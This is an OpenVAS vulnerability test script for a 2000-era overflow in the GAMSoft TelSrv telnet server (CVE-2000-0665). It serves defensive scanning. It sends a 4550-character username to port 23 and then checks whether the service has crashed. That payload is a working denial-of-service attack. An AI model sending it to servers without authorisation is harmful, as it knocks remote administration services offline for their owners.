# OpenVAS Vulnerability Test
# $Id: TelSrv_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: GAMSoft TelSrv 1.4/1.5 Overflow
#
# Authors:
# Prizm <Prizm@RESENTMENT.org>
# Changes by rd: 
# - description changed somehow
# - handles the fact that the shareware may not be registered
#
# Copyright:
# Copyright (C) 2000 Prizm <Prizm@RESENTMENT.org
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It is possible to crash the remote telnet server by
sending a username that is 4550 characters long.

An attacker may use this flaw to prevent you
from administering this host remotely.";

tag_solution = "Contact your vendor for a patch.";

if(description) {
    script_id(10474);
    script_version("$Revision: 17 $");
    script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
    script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
    script_bugtraq_id(1478);
    script_tag(name:"cvss_base", value:"5.0");
    script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
    script_tag(name:"risk_factor", value:"Medium");
    script_cve_id("CVE-2000-0665");
    name = "GAMSoft TelSrv 1.4/1.5 Overflow";
    script_name(name);

    desc = "
    Summary:
    " + tag_summary + "
    Solution:
    " + tag_solution;



    script_description(desc);

    summary = "Crash GAMSoft TelSrv telnet server.";
    script_summary(summary);

    script_category(ACT_DENIAL);

    script_copyright("This script is Copyright (C) 2000 Prizm <Prizm@RESENTMENT.org");
    family = "Denial of Service";
    script_family(family);
    script_dependencies("find_service.nasl");
    script_require_ports("Services/telnet", 23);
    if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
      script_tag(name : "solution" , value : tag_solution);
      script_tag(name : "summary" , value : tag_summary);
    }
    exit(0);
}
include('telnet_func.inc');
port = get_kb_item("Services/telnet");
if(!port)port = 23;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = telnet_negotiate(socket:soc);
  r2 = recv(socket:soc, length:4096);
  r = r + r2;
  if(r)
  {
  r = recv(socket:soc, length:8192);
  if("5 second delay" >< r)sleep(5);
  r = recv(socket:soc, length:8192);
  req = string(crap(4550), "\r\n");
  send(socket:soc, data:req);
  close(soc);
  sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_warning(port);
  else {
        r = telnet_negotiate(socket:soc2);
	r2 = recv(socket:soc2, length:4096);
	r = r + r2;
        close(soc2);
        if(!r)security_warning(port);
      }
  }  
}

